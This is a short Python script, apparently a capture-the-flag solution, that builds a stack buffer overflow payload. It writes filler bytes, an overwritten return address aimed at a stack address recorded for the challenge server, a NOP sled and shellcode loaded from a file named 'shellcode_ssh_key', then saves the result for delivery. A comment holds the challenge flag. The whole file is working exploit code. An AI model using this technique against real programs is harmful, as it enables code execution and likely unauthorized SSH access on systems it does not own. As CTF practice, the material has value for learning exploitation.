import struct

# top of the stack + 8 Here's a potentially useful stack address: 
# local 0x7fffffffdce0  : solution 0x7fffffffdd28
# server 0x7fffffffec90 : solution 0x007fffffffecd0
# pwnie{Smashing Stacks All the live long Day!}

if __name__ == "__main__":
    with open("shellcode_ssh_key", "rb") as file:
        shellcode = file.read()
    payload = b'a'*104
    payload += struct.pack("<Q",0x007fffffffecd0) # Make sure this is higher than the return address, somewhere in NOP sled
    payload += b'\x90'*100 #NOP sled
    payload += shellcode
    
    # print(payload)

    with open("payload", "wb") as file:
        file.write(payload)
    # print(payload)